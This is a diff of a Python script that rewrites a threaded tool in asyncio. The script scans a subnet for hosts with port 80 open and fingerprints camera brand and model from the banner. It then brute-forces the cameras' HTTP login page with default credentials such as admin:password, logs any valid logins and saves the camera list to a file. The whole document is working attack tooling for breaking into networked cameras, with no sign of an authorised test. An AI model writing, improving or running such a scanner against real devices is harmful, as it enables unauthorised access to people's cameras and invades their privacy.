@@ -1,28 +1,38 @@
 import socket
-import threading
+import asyncio
 import requests
-from queue import Queue
 import netaddr
+import logging
+
+logging.basicConfig(level=logging.INFO)
 
 def ip_range(target_subnet):
     network = netaddr.IPNetwork(target_subnet)
     return [str(ip) for ip in network]
 
-def portscan(ip, port):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+async def portscan(ip, port):
     try:
-        sock.connect((ip, port))
+        reader, writer = await asyncio.open_connection(ip, port)
+        writer.close()
+        await writer.wait_closed()
         return True
-    except:
+    except (socket.timeout, ConnectionRefusedError):
+        return False
+    except Exception as e:
+        logging.error(f"Error scanning {ip}: {e}")
         return False
 
 def get_camera(ip, port):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((ip, port))
-    data = sock.recv(1024)
-    brand = data.split()[0]
-    model = data.split()[1]
-    cameras.append({'ip': ip, 'brand': brand, 'model': model})
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((ip, port))
+        data = sock.recv(1024)
+        brand = data.split()[0]
+        model = data.split()[1]
+        return {'ip': ip, 'brand': brand, 'model': model}
+    except Exception as e:
+        logging.error(f"Error retrieving camera information from {ip}: {e}")
+        return None
 
 def bruteforce(ip, credentials):
     for username, password in credentials:
@@ -30,38 +40,36 @@ def bruteforce(ip, credentials):
             url = f'http://{ip}/login.htm'
             r = requests.get(url, auth=(username, password))
             if r.status_code == 200:
-                print(f'[+] Found valid creds: {username}:{password} at {ip}')
+                logging.info(f'Found valid creds: {username}:{password} at {ip}')
                 break
-        except:
-            pass
+        except Exception as e:
+            logging.error(f"Error bruteforcing {ip} with {username}:{password}: {e}")
+
+async def scan(ip, port, credentials):
+    if await portscan(ip, port):
+        camera_info = get_camera(ip, port)
+        if camera_info:
+            cameras.append(camera_info)
+            bruteforce(ip, credentials)
 
 try:
     target_subnet = "192.168.0.0/24"
     credentials = [('admin', 'password'), ('user', '12345')]
 
     cameras = []
-    queue = Queue()
-    for ip in ip_range(target_subnet):
-        queue.put(ip)
+    ip_addresses = ip_range(target_subnet)
 
-    threads = [] 
+    async def main():
+        tasks = []
+        for ip in ip_addresses:
+            tasks.append(scan(ip, 80, credentials))
 
-    def scan(ip):
-        if portscan(ip, 80):
-            get_camera(ip, 80)
-            bruteforce(ip, credentials)
+        await asyncio.gather(*tasks)
 
-    for i in range(256):
-        thread = threading.Thread(target=scan, args=(queue.get(),))
-        thread.daemon = True
-        thread.start()
-        threads.append(thread)
-
-    for thread in threads:
-        thread.join()
+    asyncio.run(main())
 
     with open('cameras.txt', 'w') as f:
         for camera in cameras:
             f.write(f"{camera['ip']} {camera['brand']} {camera['model']}\n")
 except Exception as e:
-    print(e)
+    logging.error(f"An error occurred: {e}")
